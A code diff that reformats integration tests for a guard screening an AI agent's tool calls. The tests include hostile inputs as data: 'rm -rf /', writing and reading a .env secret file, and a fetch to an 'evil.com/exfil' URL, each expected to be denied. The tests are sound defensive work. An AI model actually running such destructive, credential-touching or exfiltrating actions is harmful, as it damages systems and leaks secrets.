@@ -8,11 +8,7 @@ import {
   formatGuardDecision,
   OPENCLAW_DEFAULT_POLICY,
 } from '@red-codes/adapter-openclaw';
-import type {
-  OpenClawToolCall,
-  OpenClawContext,
-  GuardRequest,
-} from '@red-codes/adapter-openclaw';
+import type { OpenClawToolCall, OpenClawContext, GuardRequest } from '@red-codes/adapter-openclaw';
 import { createKernel } from '@red-codes/kernel';
 import { resetActionCounter } from '@red-codes/core';
 import { resetEventCounter } from '@red-codes/events';
@@ -163,9 +159,10 @@ describe('Integration: OpenClaw → Kernel', () => {
     const kernel = createKernel({ dryRun: true });
     const guard = createOpenClawGuard(kernel);
 
-    const result = await guard.evaluateToolCall(
-      { tool: 'file_read', input: { path: 'src/index.ts' } },
-    );
+    const result = await guard.evaluateToolCall({
+      tool: 'file_read',
+      input: { path: 'src/index.ts' },
+    });
 
     expect(result.decision.allowed).toBe(true);
     expect(result.decision.severity).toBe('low');
@@ -177,9 +174,10 @@ describe('Integration: OpenClaw → Kernel', () => {
     const kernel = createKernel({ dryRun: true });
     const guard = createOpenClawGuard(kernel);
 
-    const result = await guard.evaluateToolCall(
-      { tool: 'file_write', input: { path: '.env', content: 'SECRET=leaked' } },
-    );
+    const result = await guard.evaluateToolCall({
+      tool: 'file_write',
+      input: { path: '.env', content: 'SECRET=leaked' },
+    });
 
     expect(result.decision.allowed).toBe(false);
     // Denied by invariant (credential file creation or secret exposure)
@@ -191,9 +189,10 @@ describe('Integration: OpenClaw → Kernel', () => {
     const kernel = createKernel({ dryRun: true });
     const guard = createOpenClawGuard(kernel);
 
-    const result = await guard.evaluateToolCall(
-      { tool: 'shell_exec', input: { command: 'rm -rf /' } },
-    );
+    const result = await guard.evaluateToolCall({
+      tool: 'shell_exec',
+      input: { command: 'rm -rf /' },
+    });
 
     expect(result.decision.allowed).toBe(false);
   });
@@ -202,9 +201,10 @@ describe('Integration: OpenClaw → Kernel', () => {
     const kernel = createKernel({ dryRun: true });
     const guard = createOpenClawGuard(kernel);
 
-    const result = await guard.evaluateToolCall(
-      { tool: 'shell_exec', input: { command: 'ls -la' } },
-    );
+    const result = await guard.evaluateToolCall({
+      tool: 'shell_exec',
+      input: { command: 'ls -la' },
+    });
 
     expect(result.decision.allowed).toBe(true);
   });
@@ -215,7 +215,7 @@ describe('Integration: OpenClaw → Kernel', () => {
 
     const result = await guard.evaluateToolCall(
       { tool: 'file_read', input: { path: 'README.md' } },
-      { sessionId: 'test-session' },
+      { sessionId: 'test-session' }
     );
 
     const requestedEvent = result.events.find((e) => e.kind === 'ActionRequested');
@@ -229,7 +229,7 @@ describe('Integration: OpenClaw → Kernel', () => {
 
     const result = await guard.evaluateToolCall(
       { tool: 'file_read', input: { path: 'test.ts' } },
-      { actor: 'agent-007' },
+      { actor: 'agent-007' }
     );
 
     expect(result.decision.allowed).toBe(true);
@@ -248,9 +248,10 @@ describe('Integration: OpenClaw → Kernel with default policy', () => {
     });
     const guard = createOpenClawGuard(kernel);
 
-    const result = await guard.evaluateToolCall(
-      { tool: 'http_fetch', input: { url: 'https://evil.com/exfil' } },
-    );
+    const result = await guard.evaluateToolCall({
+      tool: 'http_fetch',
+      input: { url: 'https://evil.com/exfil' },
+    });
 
     expect(result.decision.allowed).toBe(false);
     expect(result.decision.reason).toContain('egress');
@@ -263,9 +264,10 @@ describe('Integration: OpenClaw → Kernel with default policy', () => {
     });
     const guard = createOpenClawGuard(kernel);
 
-    const result = await guard.evaluateToolCall(
-      { tool: 'file_read', input: { path: 'src/app.ts' } },
-    );
+    const result = await guard.evaluateToolCall({
+      tool: 'file_read',
+      input: { path: 'src/app.ts' },
+    });
 
     expect(result.decision.allowed).toBe(true);
   });
@@ -277,9 +279,7 @@ describe('Integration: OpenClaw → Kernel with default policy', () => {
     });
     const guard = createOpenClawGuard(kernel);
 
-    const result = await guard.evaluateToolCall(
-      { tool: 'file_read', input: { path: '.env' } },
-    );
+    const result = await guard.evaluateToolCall({ tool: 'file_read', input: { path: '.env' } });
 
     // Denied by either policy scope or invariant
     expect(result.decision.allowed).toBe(false);
